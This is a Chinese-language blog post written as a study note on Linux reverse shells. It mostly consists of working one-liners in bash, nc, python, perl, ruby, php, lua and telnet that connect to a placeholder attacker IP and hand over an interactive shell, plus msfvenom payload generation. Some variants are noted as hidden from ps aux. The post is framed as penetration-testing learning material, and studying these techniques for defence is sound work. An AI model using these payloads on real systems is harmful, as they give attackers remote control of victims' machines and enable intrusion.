---
title: Linux 反弹shell实践
category: sec
---

# {{ page.title }}

## 0x00 前述

在很多渗透场景下我们都需要反弹shell。

这里的`shell`指的是靶机监听某端口，一旦有外部流量接入就分配一个shell；`反弹shell`则指攻击者的机器上监听某端口，靶机主动去连接这个端口并分配给攻击者一个shell。

`反弹shell`在以下两种环境中具有独特优势：

1. 靶机没有公网IP（或者说，没有能够直接被攻击者访问到的IP）
2. 靶机本身或所在网络的防火墙对出口流量不做限制或限制小

网络上已经有很多关于这方面的文章。本文为学习笔记。

## 0x01 反弹shell：bash

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
bash -i >& /dev/tcp/[ATTACKER-IP]/10000 0>&1
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-0.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-1.png)

注意上面的靶机只有一个内网地址`192.168.246.xxx`。

**原理**

参考[这篇文章](http://os.51cto.com/art/201709/550457.htm)。

`bash -i`是以交互方式打开一个`bash`；  

参考`man bash`的`REDIRECTION`部分：

关于`/dev/tcp/[ATTACKER-IP]/10000`：

```
/dev/tcp/host/port

If  host  is  a  valid  hostname or Internet address, 
    and port is an integer port number or service
    name, bash attempts to open the corresponding TCP socket.
```

关于`>&`：

```
&>word
or
>&word

Of the two forms, the first is preferred.  
    This is semantically equivalent to:

>word 2>&1

This construct allows both the standard output 
    (file descriptor 1) and the standard error 
    output (file descriptor 2) to be redirected 
    to the file whose name is the expansion of word.
```

所以`stderr`和`stdout`会被重定向到`/dev/tcp/[ATTACKER-IP]/10000`。

关于`0>&1`：

```
Redirections are processed in the order they
       appear, from left to right.
```

看下面两条指令：

```bash
# 1
ls > dirlist 2>&1
# 2
ls 2>&1 > dirlist
```

上面指令1会先把`ls`的`stdout`定向为`dirlist`文件，接着把`stderr`定向为`stdout`，所以这条指令会把`ls`的`标准输出`和`标准错误输出`都输出到`dirlist`文件。

指令2先把`ls`的`stderr`定向到`stdout`，即默认的屏幕输出；再把`stdout`定向到`dirlist`文件，所以最终只有`标准输出`会输出到`dirlist`。

类似的，`0>&1`会把`stdin`重定向到`stdout`的设备。而之前由于`>&`，所以实际上`stdin`也被重定向到`/dev/tcp/[ATTACKER-IP]/10000`。

## 0x02 反弹shell：nc

对于靶机上的`nc`能够通过`-e`方式执行shell的情况不再叙述，大部分靶机可能都不能用`-e`选项。这里考察`-e`选项不能使用的情况。

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER-IP] 10000 >/tmp/f
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-11.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-10.png)

反弹shell进程在`ps aux`中可以检索到。

**原理**

## 0x03 反弹shell：python

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ATTACKER-IP]",10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-3.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-2.png)

反弹shell进程在`ps aux`中可以检索到。

**原理**

## 0x04 反弹shell：perl

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
perl -e 'use Socket;$i="[ATTACKER-IP]";$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-5.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-4.png)

反弹shell进程在`ps aux`中不能检索到。

**原理**

## 0x05 反弹shell：ruby

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
ruby -rsocket -e'f=TCPSocket.open("[ATTACKER-IP]",10000).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-7.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-6.png)

反弹shell进程在`ps aux`中不能检索到。

**原理**

## 0x06 反弹shell：php

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
php -r '$sock=fsockopen("[ATTACKER-IP]",10000);exec("/bin/sh -i <&3 >&3 2>&3");'
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-9.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-8.png)

反弹shell进程在`ps aux`中可以检索到。

注：代码假设TCP连接的文件描述符为`3`。

**原理**

## 0x07 反弹shell：lua

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
lua -e "require('socket');require('os');t=socket.tcp();t:connect('[ATTACKER-IP]','10000');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

靶机上没有`lua`，我用

```bash
apt-get install lua5.2
```

安装，然而运行上面的命令时报错：

```
lua: (command line):1: module 'socket' not found:
```

## 0x08 反弹shell：telnet

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet [ATTACKER-IP] 10000 >/tmp/f
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-13.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-12.png)

反弹shell进程在`ps aux`中可以检索到。

**原理**

与`nc`中的原理相同，只是把`nc`换成了`telnet`。

## 0x09 反弹shell：bash-2

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
exec 5<>/dev/tcp/[ATTACKER-IP]/10000;cat <&5 | while read line; do $line 2>&5 >&5; done
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-15.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-14.png)

这个反弹shell的管道功能和重定向功能有问题。

**原理**

## 0x0A 反弹shell：msfvenom

`msfvenom`是一款`Payload Generator and Encoder`，在`kali`下可以找到。它能够生成各种语言的反弹shell：

查询反弹shell：

```bash
msfvenom -l payloads 'cmd/unix/reverse'
```

一般用法是用`msfvenom`生成反弹shell，在攻击者机器上开监听，复制到靶机命令行或`webshell`执行反弹shell并等待shell连上攻击者机器。为了方便，后面举例时把`kali`同时作为靶机。

举例1：生成`bash`反弹shell

```bash
msfvenom -p cmd/unix/reverse_bash lhost=[ATTACKER-IP] lport=10000 R
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-17.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-16.png)

举例2：生成`nc`反弹shell

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[ATTACKER-IP] lport=10000 R
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-19.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-18.png)

可以看到，`msfvenom`生成的反弹shell代码经过了不同程度的混淆，也更完善更隐蔽，会在反弹的shell进程结束后自行清理文件痕迹。

## 0x0B 稳定shell

有时反弹出来的shell会有各种问题，如不稳定，环境变量缺失等。此时可以在新的shell里获取一个标准的shell：

```python
python -c "import pty;pty.spawn('/bin/bash')"
```

## 0x0C 参考

- [linux下反弹shell的几种方法](http://blog.csdn.net/u012985855/article/details/64117187?utm_source=itdadao&utm_medium=referral)
- [Linux下反弹shell笔记](https://www.cnblogs.com/deen-/p/7237327.html)
- [关于Linux的反弹shell命令的解析](http://os.51cto.com/art/201709/550457.htm)
- [Linux下反弹shell方法](https://www.waitalone.cn/linux-shell-rebound-under-way.html)
- [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse Shell with Bash](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)
- [【技术分享】linux各种一句话反弹shell总结](http://bobao.360.cn/learning/detail/4551.html)
- man bash
